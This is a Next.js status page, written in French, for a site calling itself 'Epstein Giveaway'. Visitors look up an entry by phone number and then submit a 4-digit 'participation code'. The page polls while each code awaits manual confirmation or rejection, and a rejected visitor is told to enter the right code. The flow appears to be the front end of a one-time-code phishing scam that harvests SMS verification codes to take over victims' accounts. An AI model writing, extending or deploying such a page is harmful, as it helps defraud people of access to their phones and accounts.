import Link from "next/link";
import { useEffect, useState } from "react";
import {
  PHONE_COUNTRIES,
  buildPhoneWithCountry,
  findPhoneCountry,
  hasLeadingLocalZero,
  limitPhoneInputForCountry,
  phoneLengthMessage,
  validatePhoneForCountry
} from "../lib/countries";

const STATUS_LABELS = {
  pending: "Votre demande est en attente.",
  validated: "Votre demande a été confirmée.",
  rejected: "Votre demande a été refusée."
};

const CODE_STATUS_LABELS = {
  pending: "Votre code est en cours de vérification.",
  confirmed: "Votre code a été confirmé.",
  rejected: "Votre code a été refusé."
};

export default function StatusPage() {
  const [phoneCountry, setPhoneCountry] = useState("FR");
  const [phone, setPhone] = useState("");
  const [claimCodeInput, setClaimCodeInput] = useState("");
  const [result, setResult] = useState(null);
  const [status, setStatus] = useState({ type: "idle", text: "" });
  const [codeStatus, setCodeStatus] = useState({ type: "idle", text: "" });
  const selectedPhoneCountry = findPhoneCountry(phoneCountry);

  async function checkStatus(event) {
    event.preventDefault();
    setResult(null);

    if (!validatePhoneForCountry(phoneCountry, phone)) {
      setStatus({ type: "error", text: phoneLengthMessage(phoneCountry) });
      return;
    }

    setStatus({ type: "loading", text: "Recherche en cours..." });

    const response = await fetch("/api/participations/status", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: buildPhoneWithCountry(phoneCountry, phone) })
    });
    const data = await response.json();

    if (!response.ok) {
      setStatus({ type: "error", text: data.error || "Impossible de retrouver la demande." });
      return;
    }

    setClaimCodeInput("");
    setCodeStatus({ type: "idle", text: "" });
    setResult(data.participation);
    setStatus({ type: "success", text: "Demande retrouvée." });
  }

  async function submitClaimCode(event) {
    event.preventDefault();
    const normalizedInput = claimCodeInput.replace(/\D/g, "");

    if (normalizedInput.length !== 4) {
      setCodeStatus({ type: "error", text: "Entrez le code de participation à 4 chiffres." });
      return;
    }

    setCodeStatus({ type: "loading", text: "Envoi du code..." });

    const response = await fetch(`/api/participations/${result.id}/code`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code: normalizedInput })
    });
    const data = await response.json();

    if (!response.ok) {
      setCodeStatus({ type: "error", text: data.error || "Code impossible à envoyer." });
      return;
    }

    setResult(data.participation);
    setClaimCodeInput("");
    setCodeStatus({
      type: "success",
      text: "Code envoyé. Il est maintenant en cours de vérification."
    });
  }

  useEffect(() => {
    if (!result?.id || result.participantCodeStatus !== "pending") {
      return undefined;
    }

    const interval = setInterval(async () => {
      const response = await fetch(`/api/participations/${result.id}`);

      if (!response.ok) {
        return;
      }

      const data = await response.json();
      setResult(data.participation);

      if (data.participation.participantCodeStatus === "confirmed") {
        setCodeStatus({ type: "success", text: "Code confirmé." });
      }

      if (data.participation.participantCodeStatus === "rejected") {
        setCodeStatus({ type: "error", text: "Code refusé. Entrez le bon code." });
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [result?.id, result?.participantCodeStatus]);

  return (
    <main>
      <header className="siteHeader">
        <Link className="brand" href="/">Epstein Giveaway</Link>
        <nav>
          <Link href="/">Accueil</Link>
          <Link href="/signup">Participer</Link>
          <Link href="/rules">Règlement</Link>
          <Link href="/privacy">Confidentialité</Link>
        </nav>
      </header>

      <section className="signupPage">
        <div className="signupPanel statusPanel">
          <span className="eyebrow panelEyebrow">Suivi</span>
          <h1>Suivre ma demande</h1>
          <p className="panelNote">
            Entrez le numéro utilisé lors de la participation.
          </p>

          <form onSubmit={checkStatus}>
            <label htmlFor="statusPhone">Numéro de téléphone</label>
            <div className="phoneField">
              <select
                id="statusPhoneCountry"
                className="countrySelect"
                value={phoneCountry}
                onChange={(event) => setPhoneCountry(event.target.value)}
                aria-label="Pays du numéro"
              >
                {PHONE_COUNTRIES.map((country) => (
                  <option key={country.code} value={country.code}>
                    {country.label} {country.dialCode}
                  </option>
                ))}
              </select>
              <input
                id="statusPhone"
                type="tel"
                inputMode="tel"
                autoComplete="tel"
                placeholder={selectedPhoneCountry.placeholder}
                maxLength="18"
                value={phone}
                onChange={(event) => setPhone(limitPhoneInputForCountry(phoneCountry, event.target.value))}
                required
              />
            </div>
            <p className="fieldHint">{phoneLengthMessage(phoneCountry)}</p>
            {hasLeadingLocalZero(phoneCountry, phone) && (
              <p className="fieldHint warningHint">
                0 initial détecté: il sera retiré automatiquement.
              </p>
            )}

            <button className="primaryButton" type="submit" disabled={status.type === "loading"}>
              {status.type === "loading" ? "Recherche..." : "Voir le statut"}
            </button>
          </form>

          {status.text && <p className={`formStatus ${status.type}`}>{status.text}</p>}

          {result && (
            <div className="statusResult">
              <span className={`badge ${result.status}`}>{STATUS_LABELS[result.status] || "Statut inconnu"}</span>
              <dl>
                <div>
                  <dt>Cadeau</dt>
                  <dd>{result.giftLabel}</dd>
                </div>
                <div>
                  <dt>Téléphone</dt>
                  <dd>{result.maskedPhone}</dd>
                </div>
                <div>
                  <dt>Date</dt>
                  <dd>{new Date(result.createdAt).toLocaleString("fr-FR")}</dd>
                </div>
                {result.participantCodeStatus && (
                  <div>
                    <dt>Code</dt>
                    <dd>{CODE_STATUS_LABELS[result.participantCodeStatus] || "Code en attente"}</dd>
                  </div>
                )}
                {result.reviewReason && (
                  <div>
                    <dt>Raison du refus</dt>
                    <dd>{result.reviewReason}</dd>
                  </div>
                )}
              </dl>

              {result.participantCodeStatus === "pending" && (
                <div className="waitingOverlay" role="status" aria-live="polite">
                  <div className="waitingSpinner" aria-hidden="true" />
                  <strong>En attente de confirmation</strong>
                </div>
              )}

              {result.status === "validated" && result.participantCodeStatus !== "confirmed" && (
                <form className="claimCodeForm statusCodeForm" onSubmit={submitClaimCode}>
                  <label htmlFor="statusClaimCode">
                    {result.participantCodeStatus === "rejected"
                      ? "Renvoyer le code de participation"
                      : "Envoyer le code de participation"}
                  </label>
                  <input
                    id="statusClaimCode"
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]{4}"
                    maxLength="4"
                    value={claimCodeInput}
                    onChange={(event) => {
                      setClaimCodeInput(event.target.value.replace(/\D/g, "").slice(0, 4));
                      setCodeStatus({ type: "idle", text: "" });
                    }}
                    placeholder="0000"
                    required
                  />
                  <button className="primaryButton" type="submit" disabled={codeStatus.type === "loading"}>
                    {codeStatus.type === "loading" ? "Envoi..." : "Envoyer le code"}
                  </button>
                  {codeStatus.text && <p className={`formStatus ${codeStatus.type}`}>{codeStatus.text}</p>}
                </form>
              )}
            </div>
          )}
        </div>
      </section>
    </main>
  );
}
